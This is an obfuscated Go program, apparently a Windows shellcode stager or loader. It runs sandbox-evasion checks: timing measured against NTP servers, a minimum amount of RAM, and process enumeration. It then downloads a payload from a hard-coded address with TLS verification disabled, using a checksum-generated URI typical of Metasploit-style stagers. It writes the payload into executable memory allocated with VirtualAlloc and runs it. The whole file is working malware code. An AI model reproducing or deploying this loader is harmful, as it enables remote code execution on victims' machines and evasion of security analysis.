package main
import (
"syscall"
"unsafe"
"io/ioutil"
"math/rand"
"net/http"
"time"
"crypto/tls"
"runtime"
"os"
"net"
"encoding/binary"
)
const (
qTDBXPZPEXMFjt  = 0x1000
mVpyIVHiSrIkT = 0x2000
xhDkGghFJrNdV  = 0x40
)
var (
nmaidavFsIahsC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
ptxrZbSneqDxZjV = syscall.NewLazyDLL("kernel32.dll")
CBGLlUoH = ptxrZbSneqDxZjV.NewProc("VirtualAlloc")
)
func enHAiRS(kMSUuEaDv uintptr) (uintptr, error) {
rUzNcuGSRgO, _, teKUUMz := CBGLlUoH.Call(0, kMSUuEaDv, mVpyIVHiSrIkT|qTDBXPZPEXMFjt, xhDkGghFJrNdV)
if rUzNcuGSRgO == 0 {
return 0, teKUUMz
}
return rUzNcuGSRgO, nil
}
func msepGqfgvfj(ZyvpCxQ int, krvWjFVAvwq []byte) string {
KWnwLDfk := rand.New(rand.NewSource(time.Now().UnixNano()))
var Zrqedgq []byte
for ETuDmjEPSNUZ := 0; ETuDmjEPSNUZ < ZyvpCxQ; ETuDmjEPSNUZ++ {
Zrqedgq = append(Zrqedgq, krvWjFVAvwq[KWnwLDfk.Intn(len(krvWjFVAvwq))])
}
return string(Zrqedgq)
}
func UhbWtEL(ZyvpCxQ int) string {
krvWjFVAvwq := []byte(nmaidavFsIahsC)
return msepGqfgvfj(ZyvpCxQ, krvWjFVAvwq)
}
func SYIQjWeqOiV(MXTbUssbjq, ZyvpCxQ int) string {
for {
GLkpiRLpiOLokLO := 0
jjrjyeMgCpm := UhbWtEL(ZyvpCxQ)
for _, OYKYASfuGQobK := range []byte(jjrjyeMgCpm) {
GLkpiRLpiOLokLO += int(OYKYASfuGQobK)
}
if GLkpiRLpiOLokLO%0x100 == MXTbUssbjq {
return "/" + jjrjyeMgCpm
}
}
}
func main() {
KOMmdfoqDDpTCv := runtime.NumCPU()
if KOMmdfoqDDpTCv >= 1 {
type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}
sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()
ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b
binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)
val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))
time.Sleep(time.Duration(42*1000) * time.Millisecond)
newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()
second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b
binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)
if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= 42 {type rJzKRkMult struct {
	dwLength	uint32
	dwMemoryLoad	uint32
	ullTotalPhys	uint64
	ullAvailPhys	uint64
	ullTotalPageFile	uint64
	ullAvailPageFile	uint64
	ullTotalVirtual	uint64
	ullAvailVirtual	uint64
	ullAvailExtendedVirtual	uint64
}
var nyZiXiWqrLqi = syscall.NewLazyDLL("kernel32.dll")
var rwmvpYeffpWX = nyZiXiWqrLqi.NewProc("GlobalMemoryStatusEx")
var LsLnYtShWDHzso rJzKRkMult
LsLnYtShWDHzso.dwLength = uint32(unsafe.Sizeof(LsLnYtShWDHzso))
rwmvpYeffpWX.Call(uintptr(unsafe.Pointer(&LsLnYtShWDHzso)))
if (LsLnYtShWDHzso.ullTotalPhys/1073741824 >= 3) {
var HVsmXdwfU = syscall.NewLazyDLL("kernel32.dll")
var SbWFxIIPS = HVsmXdwfU.NewProc("CreateToolhelp32Snapshot")
var rCEypV = HVsmXdwfU.NewProc("Process32FirstW")
var YZEAFETj = HVsmXdwfU.NewProc("Process32NextW")
var mtmwvMDYILAcLx = HVsmXdwfU.NewProc("CloseHandle")
type bkIHQOsmhpJPDX struct {
	dwSize		uint32
	cntUsage		uint32
	th32ProcessID		uint32
	th32DefaultHeapID		uintptr
	th32ModuleID		uint32
	cntThreads		uint32
	th32ParentProcessID		uint32
	pcPriClassBase		int32
	dwFlags		uint32
	szExeFile		[260]uint16
}
SZKknyHxWddfcD := 1
ETXfVwcUtZTqT, _, _ := SbWFxIIPS.Call(2,0)
defer mtmwvMDYILAcLx.Call(ETXfVwcUtZTqT)
wNdotvJgj := make([]string, 0, 100)
var aUYjuCedn bkIHQOsmhpJPDX
aUYjuCedn.dwSize = uint32(unsafe.Sizeof(aUYjuCedn))
rCEypV.Call(ETXfVwcUtZTqT, uintptr(unsafe.Pointer(&aUYjuCedn)))
for {
	wNdotvJgj = append(wNdotvJgj, syscall.UTF16ToString(aUYjuCedn.szExeFile[:260]))
	LKRDRb, _, _ := YZEAFETj.Call(ETXfVwcUtZTqT, uintptr(unsafe.Pointer(&aUYjuCedn)))
	if LKRDRb == 0 {
		break
	}
}
SWvhkWQGOiEYbX := 0
for _, sGaUMnfPYEHMPj := range wNdotvJgj {
	if sGaUMnfPYEHMPj == "" {
		os.Exit(1)}
	SWvhkWQGOiEYbX += 1
}
if (SWvhkWQGOiEYbX >= SZKknyHxWddfcD) {
bOXMRl := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
dFdhXpDTE := http.Client{Transport: bOXMRl}
iObdTjZnJLxW := "https://192.168.10.135:8080"
BxHyVUTYpEFO, _ := dFdhXpDTE.Get(iObdTjZnJLxW + SYIQjWeqOiV(92, 83))
defer BxHyVUTYpEFO.Body.Close()
KdIrFx, _ := ioutil.ReadAll(BxHyVUTYpEFO.Body)
rUzNcuGSRgO, _ := enHAiRS(uintptr(len(KdIrFx)))
PUAPSrnTfmr := (*[990000]byte)(unsafe.Pointer(rUzNcuGSRgO))
for MtKVGwl, OYKYASfuGQobK := range KdIrFx {
PUAPSrnTfmr[MtKVGwl] = OYKYASfuGQobK
}
syscall.Syscall(rUzNcuGSRgO, 0, 0, 0, 0)
}
}}}}